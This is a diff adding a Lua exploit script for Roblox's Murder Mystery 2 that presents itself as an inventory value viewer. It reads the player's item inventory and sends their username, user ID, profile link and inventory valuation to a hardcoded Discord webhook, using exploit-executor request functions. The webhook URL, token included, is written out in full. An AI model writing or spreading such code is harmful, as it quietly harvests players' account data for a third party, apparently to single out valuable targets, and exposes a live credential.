@@ -1,0 +1,541 @@
+--[================================================================]--
+-- Script: MM2 Inventory Value & Profile Viewer + Webhook Logger
+-- Target: Game ID 142823291 (Murder Mystery 2)
+--[================================================================]--
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Game ID check removed for compatibility
+
+-- Discord Webhook URL
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1543375197560774686/SldNo18FiGJfj7Yv_5yurdRBI4VIK2kKtEK0yTiLNSWeh2lFIG4I1lNzHLlGaXizuuP_"
+
+-- KnownPrices from gumba.txt
+local KnownPrices = {
+    ["chroma traveler's gun"] = {value = 220000, rarity = "chroma"},
+    ["chroma evergun"] = {value = 75000, rarity = "chroma"},
+    ["chroma evergreen"] = {value = 48000, rarity = "chroma"},
+    ["chroma bauble"] = {value = 34000, rarity = "chroma"},
+    ["chroma vampire's gun"] = {value = 29000, rarity = "chroma"},
+    ["chroma constellation"] = {value = 30000, rarity = "chroma"},
+    ["chroma alienbeam"] = {value = 24000, rarity = "chroma"},
+    ["chroma raygun"] = {value = 14000, rarity = "chroma"},
+    ["chroma sunrise"] = {value = 13000, rarity = "chroma"},
+    ["chroma snowcannon"] = {value = 7750, rarity = "chroma"},
+    ["chroma blizzard"] = {value = 5250, rarity = "chroma"},
+    ["chroma sunset"] = {value = 8750, rarity = "chroma"},
+    ["chroma heart wand"] = {value = 4250, rarity = "chroma"},
+    ["chroma snow dagger"] = {value = 2500, rarity = "chroma"},
+    ["chroma snowstorm"] = {value = 4250, rarity = "chroma"},
+    ["chroma watergun"] = {value = 3400, rarity = "chroma"},
+    ["chroma treat"] = {value = 2100, rarity = "chroma"},
+    ["chroma sweet"] = {value = 1950, rarity = "chroma"},
+    ["chroma ornament"] = {value = 1800, rarity = "chroma"},
+    ["chroma icecream"] = {value = 1350, rarity = "chroma"},
+    ["chroma sands"] = {value = 1300, rarity = "chroma"},
+    ["chroma beachy"] = {value = 1250, rarity = "chroma"},
+    ["chroma darkbringer"] = {value = 65, rarity = "chroma"},
+    ["chroma lightbringer"] = {value = 60, rarity = "chroma"},
+    ["chroma luger"] = {value = 50, rarity = "chroma"},
+    ["chroma candleflame"] = {value = 40, rarity = "chroma"},
+    ["chroma elderwood blade"] = {value = 37, rarity = "chroma"},
+    ["chroma laser"] = {value = 40, rarity = "chroma"},
+    ["chroma swirly gun"] = {value = 38, rarity = "chroma"},
+    ["chroma cookiecane"] = {value = 32, rarity = "chroma"},
+    ["chroma deathshard"] = {value = 35, rarity = "chroma"},
+    ["chroma slasher"] = {value = 32, rarity = "chroma"},
+    ["chroma fang"] = {value = 32, rarity = "chroma"},
+    ["chroma gemstone"] = {value = 32, rarity = "chroma"},
+    ["chroma shark"] = {value = 32, rarity = "chroma"},
+    ["chroma gingerblade"] = {value = 27, rarity = "chroma"},
+    ["chroma heat"] = {value = 28, rarity = "chroma"},
+    ["chroma seer"] = {value = 28, rarity = "chroma"},
+    ["chroma tides"] = {value = 27, rarity = "chroma"},
+    ["chroma saw"] = {value = 23, rarity = "chroma"},
+    ["chroma boneblade"] = {value = 22, rarity = "chroma"},
+    ["gingerscope"] = {value = 17750, rarity = "ancient"},
+    ["traveler's axe"] = {value = 8100, rarity = "ancient"},
+    ["celestial"] = {value = 2450, rarity = "ancient"},
+    ["vampire's axe"] = {value = 1550, rarity = "ancient"},
+    ["harvester"] = {value = 250, rarity = "ancient"},
+    ["icepiercer"] = {value = 160, rarity = "ancient"},
+    ["traveler's gun"] = {value = 5600, rarity = "godly"},
+    ["evergun"] = {value = 3450, rarity = "godly"},
+    ["constellation"] = {value = 2700, rarity = "godly"},
+    ["evergreen"] = {value = 2700, rarity = "godly"},
+    ["turkey"] = {value = 2425, rarity = "godly"},
+    ["alienbeam"] = {value = 2650, rarity = "godly"},
+    ["vampire's gun"] = {value = 1950, rarity = "godly"},
+    ["darkshot"] = {value = 1800, rarity = "godly"},
+    ["darksword"] = {value = 1775, rarity = "godly"},
+    ["raygun"] = {value = 2150, rarity = "godly"},
+    ["blossom"] = {value = 1370, rarity = "godly"},
+    ["sakura"] = {value = 1360, rarity = "godly"},
+    ["sunrise"] = {value = 1200, rarity = "godly"},
+    ["bauble"] = {value = 825, rarity = "godly"},
+    ["snowcannon"] = {value = 850, rarity = "godly"},
+    ["sunset"] = {value = 700, rarity = "godly"},
+    ["soul"] = {value = 615, rarity = "godly"},
+    ["spirit"] = {value = 605, rarity = "godly"},
+    ["rainbow gun"] = {value = 420, rarity = "godly"},
+    ["flora"] = {value = 410, rarity = "godly"},
+    ["rainbow"] = {value = 410, rarity = "godly"},
+    ["bloom"] = {value = 400, rarity = "godly"},
+    ["heart wand"] = {value = 340, rarity = "godly"},
+    ["ocean"] = {value = 285, rarity = "godly"},
+    ["waves"] = {value = 280, rarity = "godly"},
+    ["xenoknife"] = {value = 325, rarity = "godly"},
+    ["xenoshot"] = {value = 325, rarity = "godly"},
+    ["flowerwood gun"] = {value = 265, rarity = "godly"},
+    ["snow dagger"] = {value = 230, rarity = "godly"},
+    ["flowerwood"] = {value = 260, rarity = "godly"},
+    ["blizzard"] = {value = 260, rarity = "godly"},
+    ["snowstorm"] = {value = 260, rarity = "godly"},
+    ["watergun"] = {value = 230, rarity = "godly"},
+    ["treat"] = {value = 155, rarity = "godly"},
+    ["corrupt"] = {value = 350, rarity = "unique"},
+    ["cane"] = {value = 700, rarity = "rare"},
+    ["candy"] = {value = 80, rarity = "godly"},
+    ["icecream"] = {value = 120, rarity = "godly"},
+    ["beachy"] = {value = 105, rarity = "godly"},
+    ["sands"] = {value = 105, rarity = "godly"},
+    ["latte"] = {value = 125, rarity = "legendary"},
+    ["icebreaker"] = {value = 65, rarity = "ancient"},
+    ["batwing"] = {value = 42, rarity = "ancient"},
+    ["elderwood scythe"] = {value = 38, rarity = "ancient"},
+    ["swirly axe"] = {value = 38, rarity = "ancient"},
+    ["hallowscythe"] = {value = 30, rarity = "ancient"},
+    ["logchopper"] = {value = 18, rarity = "ancient"},
+    ["icewing"] = {value = 13, rarity = "ancient"},
+    ["borealis"] = {value = 145, rarity = "godly"},
+    ["australis"] = {value = 140, rarity = "godly"},
+    ["glitch1"] = {value = 70, rarity = "common"},
+    ["sugar"] = {value = 32, rarity = "godly"},
+    ["luger"] = {value = 28, rarity = "godly"},
+    ["iceblaster"] = {value = 33, rarity = "godly"},
+    ["pearl"] = {value = 80, rarity = "godly"},
+    ["pearlshine"] = {value = 85, rarity = "godly"},
+    ["elderwood revolver"] = {value = 33, rarity = "godly"},
+    ["darkbringer"] = {value = 33, rarity = "godly"},
+    ["candleflame"] = {value = 33, rarity = "godly"},
+    ["lightbringer"] = {value = 33, rarity = "godly"},
+    ["makeshift"] = {value = 33, rarity = "godly"},
+    ["ornament"] = {value = 60, rarity = "godly"},
+    ["red luger"] = {value = 37, rarity = "godly"},
+    ["swirly gun"] = {value = 18, rarity = "godly"},
+    ["cotton candy"] = {value = 40, rarity = "legendary"},
+    ["jd"] = {value = 30, rarity = "legendary"},
+    ["green luger"] = {value = 23, rarity = "godly"},
+    ["laser"] = {value = 22, rarity = "godly"},
+    ["hallowgun"] = {value = 20, rarity = "godly"},
+    ["icebeam"] = {value = 18, rarity = "godly"},
+    ["amerilaser"] = {value = 22, rarity = "godly"},
+    ["plasmabeam"] = {value = 18, rarity = "godly"},
+    ["swirly blade"] = {value = 12, rarity = "godly"},
+    ["iceflake"] = {value = 15, rarity = "godly"},
+    ["plasmablade"] = {value = 15, rarity = "godly"},
+    ["shark"] = {value = 20, rarity = "godly"},
+    ["nightblade"] = {value = 20, rarity = "godly"},
+    ["minty"] = {value = 13, rarity = "godly"},
+    ["blaster"] = {value = 17, rarity = "godly"},
+    ["ginger luger"] = {value = 17, rarity = "godly"},
+    ["slasher"] = {value = 15, rarity = "godly"},
+    ["pixel"] = {value = 17, rarity = "godly"},
+    ["lugercane"] = {value = 13, rarity = "godly"},
+    ["eternalcane"] = {value = 13, rarity = "godly"},
+    ["gingerblade"] = {value = 13, rarity = "godly"},
+    ["old glory"] = {value = 15, rarity = "godly"},
+    ["battleaxe ii"] = {value = 17, rarity = "godly"},
+    ["virtual"] = {value = 13, rarity = "godly"},
+    ["jinglegun"] = {value = 13, rarity = "godly"},
+    ["gemstone"] = {value = 15, rarity = "godly"},
+    ["deathshard"] = {value = 13, rarity = "godly"},
+    ["vampire's edge"] = {value = 15, rarity = "godly"},
+    ["nebula"] = {value = 13, rarity = "godly"},
+    ["battleaxe"] = {value = 12, rarity = "godly"},
+    ["cookiecane"] = {value = 13, rarity = "godly"},
+    ["gingermint"] = {value = 12, rarity = "godly"},
+    ["<3"] = {value = 7, rarity = "common"},
+    ["ghost"] = {value = 10, rarity = "vintage"},
+    ["heat"] = {value = 10, rarity = "godly"},
+    ["frostsaber"] = {value = 10, rarity = "godly"},
+    ["fang"] = {value = 10, rarity = "godly"},
+    ["clockwork"] = {value = 10, rarity = "godly"},
+    ["chill"] = {value = 10, rarity = "godly"},
+    ["tides"] = {value = 10, rarity = "godly"},
+    ["bioblade"] = {value = 8, rarity = "godly"},
+    ["gifts"] = {value = 10, rarity = "rare"},
+    ["blood"] = {value = 8, rarity = "vintage"},
+    ["snowflake"] = {value = 5, rarity = "uncommon"},
+    ["spider"] = {value = 10, rarity = "godly"},
+    ["eternal iv"] = {value = 8, rarity = "godly"},
+    ["eternal iii"] = {value = 8, rarity = "godly"},
+    ["hallow's edge"] = {value = 8, rarity = "godly"},
+    ["hallow's blade"] = {value = 8, rarity = "godly"},
+    ["xmas"] = {value = 7, rarity = "godly"},
+    ["skulls 2019"] = {value = 8, rarity = "legendary"},
+    ["handsaw"] = {value = 8, rarity = "godly"},
+    ["eternal ii"] = {value = 7, rarity = "godly"},
+    ["boneblade"] = {value = 7, rarity = "godly"},
+    ["sweater"] = {value = 8, rarity = "rare"},
+    ["silent night"] = {value = 8, rarity = "rare"},
+    ["eternal"] = {value = 7, rarity = "godly"},
+    ["saw"] = {value = 7, rarity = "godly"},
+    ["pumpking"] = {value = 7, rarity = "godly"},
+    ["green marble"] = {value = 2, rarity = "rare"},
+    ["santa's spirit"] = {value = 3, rarity = "legendary"},
+    ["santa's magic"] = {value = 3, rarity = "legendary"},
+    ["america"] = {value = 7, rarity = "vintage"},
+    ["ufoknife"] = {value = 2650, rarity = "godly"},
+    ["ufogun"] = {value = 2650, rarity = "godly"},
+    ["sweetchroma"] = {value = 1950, rarity = "chroma"},
+    ["sweet chroma"] = {value = 1950, rarity = "chroma"},
+    ["defaultknife"] = {value = 1, rarity = "common"},
+    ["default gun"] = {value = 1, rarity = "common"},
+    ["defaultgun"] = {value = 1, rarity = "common"},
+    ["treegun2023"] = {value = 3450, rarity = "godly"},
+    ["tree gun 2023"] = {value = 3450, rarity = "godly"},
+    ["treeknife2023"] = {value = 2700, rarity = "godly"},
+    ["tree knife 2023"] = {value = 2700, rarity = "godly"},
+    ["vampiregun"] = {value = 1950, rarity = "godly"},
+}
+
+local function GetItemValue(itemName)
+    local lowerName = itemName:lower()
+    
+    -- Direct match
+    if KnownPrices[lowerName] then
+        return KnownPrices[lowerName].value, KnownPrices[lowerName].rarity
+    end
+    
+    -- Try with apostrophe variations
+    local withApostrophe = lowerName:gsub("'", "'")
+    if KnownPrices[withApostrophe] then
+        return KnownPrices[withApostrophe].value, KnownPrices[withApostrophe].rarity
+    end
+    local withoutApostrophe = lowerName:gsub("'", "")
+    if KnownPrices[withoutApostrophe] then
+        return KnownPrices[withoutApostrophe].value, KnownPrices[withoutApostrophe].rarity
+    end
+    
+    -- Try without spaces (camelCase style)
+    local noSpaces = lowerName:gsub(" ", "")
+    if KnownPrices[noSpaces] then
+        return KnownPrices[noSpaces].value, KnownPrices[noSpaces].rarity
+    end
+    
+    -- Try with spaces added (for camelCase input)
+    local withSpaces = lowerName:gsub("(%l)(%u)", "%1 %2"):lower()
+    if KnownPrices[withSpaces] then
+        return KnownPrices[withSpaces].value, KnownPrices[withSpaces].rarity
+    end
+    
+    -- Try adding "chroma" prefix if not already present
+    if not lowerName:find("chroma") then
+        local chromaName = "chroma " .. lowerName
+        if KnownPrices[chromaName] then
+            return KnownPrices[chromaName].value, KnownPrices[chromaName].rarity
+        end
+        local chromaNoSpaces = "chroma" .. lowerName
+        if KnownPrices[chromaNoSpaces] then
+            return KnownPrices[chromaNoSpaces].value, KnownPrices[chromaNoSpaces].rarity
+        end
+    end
+    
+    -- Try removing "gun" or "knife" suffix for matching
+    local withoutGun = lowerName:gsub("gun", "")
+    if KnownPrices[withoutGun] then
+        return KnownPrices[withoutGun].value, KnownPrices[withoutGun].rarity
+    end
+    local withoutKnife = lowerName:gsub("knife", "")
+    if KnownPrices[withoutKnife] then
+        return KnownPrices[withoutKnife].value, KnownPrices[withoutKnife].rarity
+    end
+    
+    return 0, "unknown"
+end
+
+local function CalculateInventory()
+    local totalValue = 0
+    local items = {}
+    
+    pcall(function()
+        local ProfileData = require(game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("ProfileData"))
+        
+        warn("ProfileData structure check:")
+        warn("ProfileData.Weapons exists: " .. tostring(ProfileData.Weapons ~= nil))
+        
+        -- Check multiple possible locations for weapon data
+        local weaponSources = {
+            ProfileData.Weapons.Owned,
+            ProfileData.Weapons,
+            ProfileData.Inventory,
+            ProfileData.Data and ProfileData.Data.Weapons
+        }
+        
+        local processedItems = {}
+        
+        for sourceIndex, source in ipairs(weaponSources) do
+            if source then
+                warn("Checking source " .. sourceIndex .. ": " .. tostring(type(source)))
+                if type(source) == "table" then
+                    -- Check if it's a direct owned table
+                    if source.Owned then
+                        warn("Found Owned sub-table in source " .. sourceIndex)
+                        for itemName, amount in pairs(source.Owned) do
+                            if amount and amount > 0 and not processedItems[itemName] then
+                                processedItems[itemName] = true
+                                local value, rarity = GetItemValue(itemName)
+                                warn("Found item: " .. itemName .. " x" .. amount .. " (Value: " .. value .. ", Rarity: " .. rarity .. ")")
+                                totalValue = totalValue + (value * amount)
+                                table.insert(items, {
+                                    name = itemName,
+                                    amount = amount,
+                                    value = value,
+                                    rarity = rarity
+                                })
+                            end
+                        end
+                    else
+                        -- Check if it's the owned table directly
+                        warn("Checking direct table in source " .. sourceIndex)
+                        for itemName, amount in pairs(source) do
+                            if type(amount) == "number" and amount > 0 and not processedItems[itemName] then
+                                processedItems[itemName] = true
+                                local value, rarity = GetItemValue(itemName)
+                                warn("Found item: " .. itemName .. " x" .. amount .. " (Value: " .. value .. ", Rarity: " .. rarity .. ")")
+                                totalValue = totalValue + (value * amount)
+                                table.insert(items, {
+                                    name = itemName,
+                                    amount = amount,
+                                    value = value,
+                                    rarity = rarity
+                                })
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        
+        -- Also check for individual weapon ownership
+        if ProfileData.Weapons then
+            warn("Checking individual weapons in ProfileData.Weapons")
+            for weaponName, weaponData in pairs(ProfileData.Weapons) do
+                if weaponName ~= "Owned" and type(weaponData) == "table" then
+                    if weaponData.Owned and weaponData.Owned > 0 and not processedItems[weaponName] then
+                        processedItems[weaponName] = true
+                        local value, rarity = GetItemValue(weaponName)
+                        warn("Found individual weapon: " .. weaponName .. " x" .. weaponData.Owned .. " (Value: " .. value .. ", Rarity: " .. rarity .. ")")
+                        totalValue = totalValue + (value * weaponData.Owned)
+                        table.insert(items, {
+                            name = weaponName,
+                            amount = weaponData.Owned,
+                            value = value,
+                            rarity = rarity
+                        })
+                    end
+                end
+            end
+        end
+        
+        warn("Total items found: " .. #items)
+        warn("Total value calculated: " .. totalValue)
+    end)
+    
+    return totalValue, items
+end
+
+-- Function to send rich embed to Discord webhook
+local function SendWebhook(totalValue, items)
+    if WEBHOOK_URL == "" or WEBHOOK_URL:find("YOUR_WEBHOOK_HERE") then
+        warn("Webhook URL is not set!")
+        return
+    end
+
+    table.sort(items, function(a, b) return (a.value * a.amount) > (b.value * b.amount) end)
+    
+    -- Separate unknown value godly items
+    local unknownGodlyItems = {}
+    local knownItems = {}
+    for _, item in ipairs(items) do
+        if item.value == 0 and item.rarity == "godly" then
+            table.insert(unknownGodlyItems, item)
+        else
+            table.insert(knownItems, item)
+        end
+    end
+    
+    -- Calculate rarity counts for stats
+    local rarityCounts = {
+        ["chroma"] = 0,
+        ["ancient"] = 0,
+        ["godly"] = 0,
+        ["legendary"] = 0,
+        ["unique"] = 0,
+        ["rare"] = 0,
+        ["uncommon"] = 0,
+        ["common"] = 0,
+        ["vintage"] = 0,
+        ["unknown"] = 0
+    }
+    
+    for _, item in ipairs(items) do
+        if rarityCounts[item.rarity] then
+            rarityCounts[item.rarity] = rarityCounts[item.rarity] + item.amount
+        else
+            rarityCounts["unknown"] = rarityCounts["unknown"] + item.amount
+        end
+    end
+    
+    -- Format top items with rarity-based emojis
+    local rarityEmojis = {
+        ["chroma"] = "🌈",
+        ["ancient"] = "🏛️",
+        ["godly"] = "⚔️",
+        ["legendary"] = "👑",
+        ["unique"] = "💎",
+        ["rare"] = "💜",
+        ["uncommon"] = "💚",
+        ["common"] = "⚪",
+        ["vintage"] = "📜",
+        ["unknown"] = "❓"
+    }
+    
+    local topItemsText = ""
+    for i = 1, math.min(10, #knownItems) do
+        local item = knownItems[i]
+        local emoji = rarityEmojis[item.rarity] or "❓"
+        local itemValue = item.value * item.amount
+        local valueFormatted = string.format("%s", itemValue)
+        topItemsText = topItemsText .. string.format("%s `#%d` **%s** (x%d) — **%s** *[%s]*\n", emoji, i, item.name, item.amount, valueFormatted, item.rarity)
+    end
+    if topItemsText == "" then
+        topItemsText = "No valuable items found."
+    end
+    
+    -- Format unknown value godly items separately
+    local unknownGodlyText = ""
+    if #unknownGodlyItems > 0 then
+        unknownGodlyText = "⚠️ **Unknown Value Godly Items:**\n"
+        for i, item in ipairs(unknownGodlyItems) do
+            unknownGodlyText = unknownGodlyText .. string.format("• **%s** (x%d) — `VALUE UNKNOWN` *[GODLY]*\n", item.name, item.amount)
+        end
+    else
+        unknownGodlyText = "✅ All godly items have known values."
+    end
+
+    -- Format rarity breakdown
+    local rarityBreakdown = ""
+    local rarityOrder = {"chroma", "ancient", "godly", "legendary", "unique", "rare", "uncommon", "common", "vintage"}
+    for _, rarity in ipairs(rarityOrder) do
+        if rarityCounts[rarity] > 0 then
+            local emoji = rarityEmojis[rarity] or "❓"
+            rarityBreakdown = rarityBreakdown .. string.format("%s **%s:** `%d`\n", emoji, rarity:upper(), rarityCounts[rarity])
+        end
+    end
+    if rarityBreakdown == "" then
+        rarityBreakdown = "No items found."
+    end
+
+    local userId = LocalPlayer.UserId
+    local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"
+    local headShotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+    
+    -- Dynamic color based on total value
+    local embedColor
+    if totalValue >= 100000 then
+        embedColor = 16711735 -- Red for super valuable
+    elseif totalValue >= 50000 then
+        embedColor = 16750848 -- Orange for very valuable
+    elseif totalValue >= 10000 then
+        embedColor = 16776960 -- Yellow for valuable
+    elseif totalValue >= 5000 then
+        embedColor = 65280 -- Green for decent value
+    else
+        embedColor = 3092790 -- Blue for lower value
+    end
+
+    local data = {
+        ["username"] = "💎 MM2 Inventory Tracker",
+        ["avatar_url"] = "https://i.imgur.com/71BCA1m.png",
+        ["embeds"] = {
+            {
+                ["title"] = "� **INVENTORY SCAN COMPLETE** 🔮",
+                ["url"] = profileLink,
+                ["description"] = string.format("**%s**'s inventory has been scanned and valued!\n```fix\nTotal Value: %d```", LocalPlayer.Name, totalValue),
+                ["color"] = embedColor,
+                ["fields"] = {
+                    {
+                        ["name"] = "👤 **PLAYER INFORMATION**",
+                        ["value"] = string.format("**Username:** [%s](%s)\n**User ID:** `%d`\n**Profile:** [View Profile](%s)", LocalPlayer.Name, profileLink, userId, profileLink),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "� **INVENTORY STATS**",
+                        ["value"] = string.format("**Total Items:** `%d`\n**Total Value:** `%d`\n**Avg Value/Item:** `%d`", #items, totalValue, #items > 0 and math.floor(totalValue / #items) or 0),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "🎮 **GAME INFO**",
+                        ["value"] = string.format("**Game ID:** `%d`\n**Game:** Murder Mystery 2", game.GameId),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "🏆 **TOP 10 MOST VALUABLE**",
+                        ["value"] = topItemsText,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "⚠️ **UNKNOWN VALUE GODLY ITEMS**",
+                        ["value"] = unknownGodlyText,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "📈 **RARITY BREAKDOWN**",
+                        ["value"] = rarityBreakdown,
+                        ["inline"] = true
+                    }
+                },
+                ["thumbnail"] = {
+                    ["url"] = headShotUrl
+                },
+                ["author"] = {
+                    ["name"] = "MM2 Value Tracker",
+                    ["icon_url"] = "https://i.imgur.com/71BCA1m.png"
+                },
+                ["footer"] = {
+                    ["text"] = "⚡ MM2 Inventory Viewer • Executed Locally • " .. os.date("%Y-%m-%d %H:%M:%S"),
+                    ["icon_url"] = "https://i.imgur.com/71BCA1m.png"
+                },
+                ["timestamp"] = DateTime.now():ToIsoDate()
+            }
+        }
+    }
+
+    local encodedData = HttpService:JSONEncode(data)
+    
+    local success, err = pcall(function()
+        local requestFunc = syn and syn.request or http_request or request or HttpPost
+        if requestFunc then
+            requestFunc({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = encodedData
+            })
+        else
+            HttpService:PostAsync(WEBHOOK_URL, encodedData)
+        end
+    end)
+
+    if not success then
+        warn("Failed to send webhook: " .. tostring(err))
+    end
+end
+
+-- Run inventory analysis and transmit webhook
+local totalValue, items = CalculateInventory()
+SendWebhook(totalValue, items)
